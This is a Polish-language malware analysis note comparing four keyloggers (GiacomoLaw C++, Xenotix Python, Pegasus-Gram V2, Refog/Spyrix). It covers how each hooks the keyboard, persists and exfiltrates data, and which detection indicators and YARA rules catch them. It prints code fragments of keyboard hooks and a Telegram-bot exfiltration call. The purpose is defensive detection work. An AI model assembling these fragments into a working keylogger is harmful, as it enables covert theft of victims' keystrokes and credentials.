---
title: "Keyloggery — analiza (keylogger-for-windows, Python, Advanced V2, Refog/Spyrix)"
date: 2026-08-15
updated: 2026-08-15
tags: [keylogger, malware, reverse-engineering, detection, windows]
status: analysis
category: malware
---

# Keyloggery — analiza i reverse engineering

Analiza 4 keyloggerów (15.08). Źródła open-source sklonowane na `.139`:
`/opt/keyloggers/{keylogger-cpp, keylogger-python, keylogger-adv}`.
Refog/Spyrix = komercyjne (opis + detekcja z publicznej wiedzy).

Powiązane: [[Hunt_Keylogger]] · [[Phishing_Deep_Dive]] · [[Klasyfikacja_Korpus]]

## Przegląd

| Narzędzie | Język | Mechanizm przechwytu | Exfil / log | Persystencja |
|-----------|-------|---------------------|-------------|--------------|
| keylogger-for-windows (GiacomoLaw/Keylogger) | C++ | `SetWindowsHookEx(WH_KEYBOARD_LL)` | plik `logs/*.log` (rotacja godzinowa) | brak |
| KeyLogger (Xenotix) | Python 2 | `pyHook` + `pythoncom` | lokalnie / Google Form / SMTP / FTP | rejestr Run |
| Advanced Keylogger V2 (Pegasus-Gram) | Python 3 | `pynput` (listener) | **Telegram** + clipboard + screenshot | brak (w kodzie) |
| Refog / Spyrix | komercyjny (C/C++ .exe) | sterownik / hook (zamknięty) | zdalny panel (web) | usługa + sterownik |

---

## 1. keylogger-for-windows — GiacomoLaw/Keylogger (C++)

`windows/klog_main.cpp` — minimalny, „podręcznikowy" keylogger.

### Mechanizm (z kodu)

```cpp
_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);  // globalny low-level hook

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) { ... Save(key_stroke); }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}
```

- **`WH_KEYBOARD_LL`** = globalny low-level keyboard hook (nie wymaga DLL, działa od Vista+).
- **Mapa klawiszy** `VK_*` → tekst (`VK_BACK`→`[BACKSPACE]`, `VK_SPACE`→`_`, `VK_RETURN`→`\n`).
- **Kontekst okna**: `GetForegroundWindow()` + `GetWindowTextA()` + `GetKeyboardLayout()` —
  loguje **w jakim oknie** pisze ofiara (wartościowe dla atakującego).
- **Log**: `logs/%Y-%m-%d__%H-%M-%S.log` (rotacja co godzinę, `ofstream`).

### Detekcja

- Import `SetWindowsHookExW/A` + `WH_KEYBOARD_LL` + `GetForegroundWindow` + `GetWindowTextA`.
- Plik logów `logs/*.log` z wzorcem `[BACKSPACE]`, `[SHIFT]`, `[TAB]`.
- YARA: stringi `[BACKSPACE]`, `WH_KEYBOARD_LL`, `HookCallback`.

---

## 2. KeyLogger (Python) — Xenotix (ajinabraham)

`xenotix_python_logger.py` — Python 2, klasyczny.

### Mechanizm

```python
import pythoncom, pyHook          # pyHook = stary hook API
...
def OnKeyboardEvent(event):       # callback pyHook
    log += chr(event.Ascii)       # przechwycenie znaku
```

- **pyHook** (nie pynput) — stary, Python 2, wymaga `pythoncom`.
- **4 tryby exfil**:
  - `local` → `keylogs.txt`
  - `remote` → **Google Form** (urllib POST do formularza)
  - `email` → SMTP (`smtplib`)
  - `ftp` → FTP upload (`ftplib`)
- **Persystencja**: rejestr `HKCU\...\Run` → `SetValueEx(..., "Xenotix Keylogger", REG_SZ, path)`.

### Detekcja

- Rejestr Run z wartością `Xenotix Keylogger`.
- Ruch: POST do `docs.google.com/forms/...` z pola kluczy (Google Form exfil).
- Importy `pyHook`, `pythoncom`, `smtplib`, `ftplib`.

---

## 3. Advanced Keylogger Tool V2 — Pegasus-Gram (Python 3)

Wielomodulowy: `keylogger.py` + `clipboard_monitor.py` + `screenshot_taker.py` + `telegram_utils.py`.

### Mechanizm

```python
from pynput import keyboard          # pynput = listener (cross-platform)
def on_press(key):
    log += format_key(key)           # formatuje klawisz
...
# exfil:
import telegram
bot = telegram.Bot(token=bot_token)
await bot.send_message(chat_id=chat_id, text=text)   # → Telegram
```

- **pynput** (nie pyHook) — nowoczesny, działa na Win/Linux/Mac.
- **Exfil = Telegram** (bot token + chat_id w `config.py`).
- **Dodatkowo**: clipboard monitor + screenshot taker — pełny monitoring (nie tylko klawisze).
- Konfiguracja w `config.py` (token, chat_id, interwały).

### Detekcja

- Ruch do `api.telegram.org/bot<TOKEN>/sendMessage` / `sendDocument` z hosta użytkownika.
- Proces/import `pynput` + `telegram` (Python).
- Pliki `config.py` z `BOT_TOKEN`, `CHAT_ID`.

---

## 4. Refog / Spyrix (komercyjne)

Zamknięte źródło — opis z publicznej wiedzy + detekcji.

| | Refog Keylogger | Spyrix Keylogger |
|--|--|--|
| Typ | monitoring Windows (parental/employee) | monitoring Windows (rodzina „Spyrix") |
| Funkcje | klawisze, screenshoty, www, clipboard, czaty | klawisze, screenshoty, webcam, mikrofon, clipboard |
| Zdalny dostęp | panel / raporty | **web dashboard** (Spyrix Personal Monitor) |
| Instalacja | ukryta usługa + sterownik | ukryty proces + usługa |
| Nadużycie | często używany jako spyware | popularny „legalny" spyware |

### Detekcja Refog/Spyrix

- **AV**: oba są znane → sygnatury większości AV (np. `Refog.Keylogger`, `Spyrix.Keylogger`).
- **Procesy/usługi**: Refog = ukryty proces (losowa nazwa), Spyrix = nazwy typu `sx*`, `spyrix*`.
- **Pliki**: `%ProgramFiles%`/`%AppData%` ukryte katalogi + `*.dat` (logi szyfrowane).
- **Sieć**: połączenia do panelu producenta (Spyrix → domena `spyrix.com` / CDN).
- **Behavioural**: hook `SetWindowsHookEx`/sterownik filtru klawiatury (KernelLogger).

---

## Wspólne wskaźniki keyloggerów (detekcja)

1. **API hookingu**: `SetWindowsHookEx(WH_KEYBOARD_LL)`, `GetAsyncKeyState` (polling), `pyHook`/`pynput`.
2. **Kontekst**: `GetForegroundWindow` + `GetWindowText` (logują okno ofiary).
3. **Exfil**: Google Forms / SMTP / FTP / **Telegram Bot API** / panel web.
4. **Persystencja**: rejestr `Run`, usługa, sterownik.
5. **Artefakty**: pliki `keylogs.txt`, `logs/*.log`, tokeny Telegram w config.

## Reguły detekcji

YARA → `/root/android-pipeline/tools/yara-rules/custom/keyloggers.yar` (5 reguł).

Zweryfikowane na żywych plikach:
- `Keylog_Win_Cpp_Hook` — C++ (5/5 stringów obecnych; reguła wymaga MZ = do skompilowanych EXE).
- `Keylog_Python_Xenotix` — ✅ xenotix_python_logger.py
- `Keylog_Advanced_Pynput` + `Keylog_Advanced_Telegram` — ✅ keylogger.py / telegram_utils.py / config.py

## Next

1. Dynamiczna analiza pynput/Telegram keyloggera (przechwycić ruch `api.telegram.org`).
2. Suricata: reguła na exfil Telegram (`sendMessage`/`sendDocument` z hosta).
3. Refog/Spyrix: pobrać trial i wyciągnąć IOCs (procesy/pliki/usługi) w sandboxie `.57`.
